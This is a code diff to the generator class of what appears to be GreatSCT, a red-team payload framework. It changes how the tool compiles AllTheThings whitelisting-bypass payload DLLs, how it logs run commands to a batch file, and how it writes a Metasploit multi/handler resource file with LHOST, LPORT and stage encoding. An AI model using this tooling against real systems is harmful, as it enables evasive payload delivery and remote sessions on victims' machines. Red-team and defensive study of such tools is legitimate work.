@@ -181,7 +181,7 @@ class Generator():
         :type run_info: string
         """
         with open('./GenerateAll/gr8sct.bat', 'a+') as f:
-            f.write(run_info + '\n')
+            f.write("start {0}\n".format(run_info))
             f.write('timeout 30 > NUL\n')
 
     def compileAllTheThings(self, name):
@@ -191,20 +191,21 @@ class Generator():
         :param name: name of the payload
         :type name: string
         """
+
         build_steps = [
-            "apt-get install mono-complete -y >/dev/null 2>&1",
-            "git clone https://github.com/ConsciousHacker/AllTheThings >/dev/null 2>&1",
-            "wget https://github.com/mono/nuget-binary/raw/master/nuget.exe -O nuget.exe >/dev/null 2>&1",
-            "cp ./GenerateAll/allthethings_{0}.cs ./AllTheThings/AllTheThings/Program.cs".format(name),
-            "rm ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll >/dev/null 2>&1",
-            "mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln >/dev/null 2>&1",
-            "mdtool build '--configuration:Release' ./AllTheThings/AllTheThings/AllTheThings.csproj >/dev/null 2>&1",
-            "cp ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll ./GenerateAll/AllTheThings_{0}.dll >/dev/null 2>&1".format(
-                name)
+            "apt-get install mono-complete -y",
+            "git clone https://github.com/ConsciousHacker/AllTheThings",
+            "wget https://github.com/mono/nuget-binary/raw/master/nuget.exe -O nuget.exe",
+            "cp {0} ./AllTheThings/AllTheThings/Program.cs".format(name),
+            "rm ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll >/dev/null",
+            "mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln",
+            "mdtool build '--configuration:Release' ./AllTheThings/AllTheThings/AllTheThings.csproj",
+            "cp ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll {0}".format(
+                name.replace('.cs', '.dll'))
         ]
 
         for step in build_steps:
-            os.system(step)
+            os.system("{0} >/dev/null 2>&1".format(step))
 
     def genMetasploitReourceFile(self, host, port, payload):
         """
@@ -219,16 +220,17 @@ class Generator():
 
         .. todo:: make dynamic for architecture
         """
+
         msfrc = '''use exploit/multi/handler
 set TimestampOutput true
 set VERBOSE true
 set ExitOnSession false
 set EnableStageEncoding true
-set AutoRunScript /opt/GreatSCT/GenerateAll/payloadtracker.rc
+set AutoRunScript {3}/GenerateAll/payloadtracker.rc
 set LHOST {0}
 set LPORT {1}
 set payload {2}
-run -j'''.format(host, port, payload)
+run -j'''.format(host, port, payload, os.getcwd())
 
         with open('./GenerateAll/gr8sct.rc', 'w+') as f:
             f.write(msfrc)
